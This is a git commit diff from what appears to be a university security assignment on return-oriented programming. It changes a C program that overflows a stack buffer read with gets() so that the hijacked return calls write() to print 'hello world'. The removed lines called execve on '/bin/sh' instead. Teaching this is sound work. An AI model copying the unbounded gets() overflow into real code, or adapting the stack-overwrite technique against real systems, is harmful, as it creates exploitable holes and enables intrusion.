4fb16a323d550abf858becc6ed06036ffaf364b2
underhood31 <manavjeet18295@iiitd.ac.in>
2021-05-03 01:00:30 +0530

    bonus done

--- Assignment_2/return_oriented_programming/bonus.c
+++ Assignment_2/return_oriented_programming/bonus.c
@@ -8,7 +8,7 @@ void called(unsigned long a, unsigned long b, unsigned long c){
 
 int main(){
 	char name[64],*cptr;
-        unsigned long *ptr;
+        void *ptr;
 	printf("buffer address: %p\n", name);  //print address of buffer
         puts("Enter text for name:");
         gets(name);
@@ -16,19 +16,19 @@ int main(){
         printf("execve of execve: %p\n", execve);
         
         memset(name,0,64);
-        strcpy(name,"/bin/sh"); 
+        strcpy(name,"hello world\n"); 
         
         cptr = name+80+8;
         ptr = (unsigned long *)cptr;
      
 	
         
-        *(ptr+5) = (unsigned long *) name; //first arg
-	*(ptr+6) = (unsigned long*) NULL;        //second //arg
-	*(ptr+7)=(unsigned long *)NULL;	//third arg
-	// *(ptr+3) = (unsigned long *)execve;
+        *((int*)(ptr+5*(sizeof(void*)))) = (int) 1; //first arg
+	*((unsigned long*)(ptr+5*(sizeof(void*))+sizeof(int))) = (unsigned long*) name;        //second //arg
+	*((unsigned long*)(ptr+6*(sizeof(void*))+sizeof(int)))=(unsigned long)12;	//third arg
+	*((unsigned long *)(ptr+3*(sizeof(void*)))) = (unsigned long *)write;
 	//OR if randomization is disabled
-	*(ptr+3) = (unsigned long *)0xf7e9e2b0;
+	// *(ptr+3) = (unsigned long *)0xf7e4a2b0;
 	
 
         return 0;
